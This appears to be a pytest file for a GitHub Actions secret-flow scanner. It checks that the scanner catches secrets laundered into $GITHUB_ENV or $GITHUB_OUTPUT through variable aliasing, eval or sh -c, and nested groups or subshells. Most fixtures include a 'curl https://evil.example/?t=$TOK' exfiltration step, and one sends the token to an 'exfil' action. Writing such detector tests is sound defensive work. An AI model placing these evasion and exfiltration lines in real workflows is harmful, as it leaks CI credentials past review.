"""Tests for the post-evasion-shape GHA gaps:

- Target-via-variable laundering (``T=$GITHUB_ENV; ... >> $T``)
- Dynamic eval of the redirect (``eval "... >> $GITHUB_ENV"``)
- Nested groups / subshells

Each is a documented evasion the previous pass left uncovered;
this file checks the closures hold.
"""

from __future__ import annotations

from pathlib import Path

from packages.sca.supply_chain.gha_secret_flow import scan_target


def _write_wf(tmp_path: Path, name: str, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / name
    p.write_text(body, encoding="utf-8")
    return p


def _downstream_fires(hits, idx: int) -> bool:
    return any(
        h.sink_kind == "run_block" and h.step_index == idx
        for h in hits
    )


# ---------------------------------------------------------------------------
# Target-via-variable laundering
# ---------------------------------------------------------------------------

def test_var_aliased_target_propagates(tmp_path: Path) -> None:
    """``T=$GITHUB_ENV; echo X=Y >> $T`` — the redirect via the
    aliased shell var must still propagate taint."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          T=$GITHUB_ENV
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> $T
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_var_aliased_target_quoted_assignment(tmp_path: Path) -> None:
    """``T="$GITHUB_ENV"`` — quoted RHS assignment also propagates."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          T="$GITHUB_ENV"
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> "$T"
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_var_aliased_target_braced(tmp_path: Path) -> None:
    """``T=${GITHUB_ENV}`` — brace form on RHS also propagates."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          T=${GITHUB_ENV}
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> $T
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_var_aliased_target_export_prefix(tmp_path: Path) -> None:
    """``export T=$GITHUB_ENV`` — export-prefixed assignment also
    aliases the target."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          export T=$GITHUB_ENV
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> $T
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_var_alias_to_github_output_propagates(tmp_path: Path) -> None:
    """Aliasing applies to ``$GITHUB_OUTPUT`` as well."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: launder
        run: |
          O=$GITHUB_OUTPUT
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> $O
      - uses: nobody/exfil@v1
        with:
          payload: ${{ steps.launder.outputs.TOK }}
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "untrusted_action" for h in hits)


def test_non_aliased_var_does_not_propagate(tmp_path: Path) -> None:
    """``T=/tmp/file`` — assigning a non-GHA-target value must NOT
    cause ``>> $T`` to be treated as a GHA-target redirect."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          T=/tmp/decoy
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> $T
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    # Step 1's body has no $TOK binding; no finding from this path.
    assert not _downstream_fires(hits, 1)


# ---------------------------------------------------------------------------
# Dynamic eval / bash -c redirect
# ---------------------------------------------------------------------------

def test_eval_redirect_propagates(tmp_path: Path) -> None:
    """``eval "echo X=Y >> $GITHUB_ENV"`` — the redirect hidden in
    the eval string must still register the binding."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          eval "echo TOK=${{ secrets.NPM_TOKEN }} >> $GITHUB_ENV"
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_bash_dash_c_redirect_propagates(tmp_path: Path) -> None:
    """``bash -c "echo X=Y >> $GITHUB_ENV"`` — same as eval."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          bash -c "echo TOK=${{ secrets.NPM_TOKEN }} >> $GITHUB_ENV"
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_sh_dash_c_single_quoted_redirect(tmp_path: Path) -> None:
    """``sh -c 'echo X=Y >> $GITHUB_ENV'`` — single-quoted form."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          sh -c 'echo TOK=$NPM_TOKEN >> $GITHUB_ENV'
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


# ---------------------------------------------------------------------------
# Nested groups / subshells
# ---------------------------------------------------------------------------

def test_nested_group_propagates(tmp_path: Path) -> None:
    """``{ { echo X=Y; }; } >> $GITHUB_ENV`` — nested group.  The
    previous non-nested regex would have failed to find the outer
    closer; the brace-balancer succeeds."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          {
            {
              echo "TOK=${{ secrets.NPM_TOKEN }}"
            }
          } >> $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_nested_subshell_propagates(tmp_path: Path) -> None:
    """``( ( echo X=Y; ) ) >> $GITHUB_ENV`` — nested subshells."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          (
            (
              echo "TOK=${{ secrets.NPM_TOKEN }}"
            )
          ) >> $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_mixed_brace_subshell_propagates(tmp_path: Path) -> None:
    """``{ ( echo X=Y; ); } >> $GITHUB_ENV`` — mixed nesting."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          {
            (
              echo "TOK=${{ secrets.NPM_TOKEN }}"
            )
          } >> $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)
